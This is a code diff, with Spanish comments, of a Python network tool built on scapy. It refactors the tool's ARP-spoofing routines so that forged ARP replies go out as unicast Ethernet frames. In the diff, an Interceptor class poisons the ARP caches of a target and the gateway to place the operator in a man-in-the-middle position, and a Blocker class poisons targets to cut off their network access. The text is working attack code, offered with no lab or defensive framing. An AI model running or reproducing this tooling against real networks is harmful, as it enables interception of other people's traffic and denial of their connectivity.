@@ -22,6 +22,13 @@ import threading
 import atexit
 
 
+def _send_arp(**fields):
+    """Envia una respuesta ARP como trama Ethernet unicast."""
+    from scapy.all import ARP, Ether, sendp
+    destination = fields.get("hwdst")
+    sendp(Ether(dst=destination) / ARP(**fields), verbose=0)
+
+
 # --------------------------------------------------------------------------- #
 #  Reenvio de IP (para no cortarle internet al objetivo)
 # --------------------------------------------------------------------------- #
@@ -121,10 +128,9 @@ class Interceptor:
         # spoof inmediato (varias rafagas) para que la intercepcion arranque ya
         if self.gateway_ip and self.gateway_mac:
             try:
-                from scapy.all import ARP, send
                 for _ in range(3):
-                    send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip), verbose=0)
-                    send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip), verbose=0)
+                    _send_arp(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip)
+                    _send_arp(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip)
                     time.sleep(0.2)
             except Exception:
                 pass
@@ -146,25 +152,21 @@ class Interceptor:
 
     # -- spoofing ----------------------------------------------------------- #
     def _spoof_once(self):
-        from scapy.all import ARP, send
         with self._lock:
             items = list(self.targets.items())
         for ip, mac in items:
             # Al objetivo: "yo (router) estoy en mi_mac"
-            send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip),
-                 verbose=0)
+            _send_arp(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip)
             # Al router: "yo (objetivo) estoy en mi_mac"
-            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip),
-                 verbose=0)
+            _send_arp(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip)
 
     def _restore(self, ip, mac):
         """Reenvia las asociaciones ARP correctas para sanar la red."""
-        from scapy.all import ARP, send
         for _ in range(5):
-            send(ARP(op=2, pdst=ip, hwdst=mac,
-                     psrc=self.gateway_ip, hwsrc=self.gateway_mac), verbose=0)
-            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
-                     psrc=ip, hwsrc=mac), verbose=0)
+            _send_arp(op=2, pdst=ip, hwdst=mac,
+                      psrc=self.gateway_ip, hwsrc=self.gateway_mac)
+            _send_arp(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
+                      psrc=ip, hwsrc=mac)
             time.sleep(0.2)
 
     # -- ciclo de vida ------------------------------------------------------ #
@@ -248,9 +250,9 @@ class Blocker:
         with self._lock:
             mac = self.targets.pop(ip, None)
         if mac and self.gateway_ip and self.gateway_mac:
-            from scapy.all import ARP, send
             for _ in range(5):
-                send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac), verbose=0)
+                _send_arp(op=2, pdst=ip, hwdst=mac,
+                          psrc=self.gateway_ip, hwsrc=self.gateway_mac)
                 time.sleep(0.2)
         if not self.list_targets():
             self.stop()
@@ -261,13 +263,12 @@ class Blocker:
             return list(self.targets.keys())
 
     def _loop(self):
-        from scapy.all import ARP, send
         while self._running:
             with self._lock:
                 items = list(self.targets.items())
             for ip, mac in items:
                 try:
-                    send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip), verbose=0)
+                    _send_arp(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip)
                 except Exception:
                     pass
             time.sleep(1.2)
@@ -281,12 +282,10 @@ class Blocker:
             self.targets.clear()
         if self.gateway_ip and self.gateway_mac:
             try:
-                from scapy.all import ARP, send
                 for ip, mac in items:
                     for _ in range(5):
-                        send(ARP(op=2, pdst=ip, hwdst=mac,
-                                 psrc=self.gateway_ip, hwsrc=self.gateway_mac),
-                             verbose=0)
+                        _send_arp(op=2, pdst=ip, hwdst=mac,
+                                  psrc=self.gateway_ip, hwsrc=self.gateway_mac)
                         time.sleep(0.1)
             except Exception:
                 pass
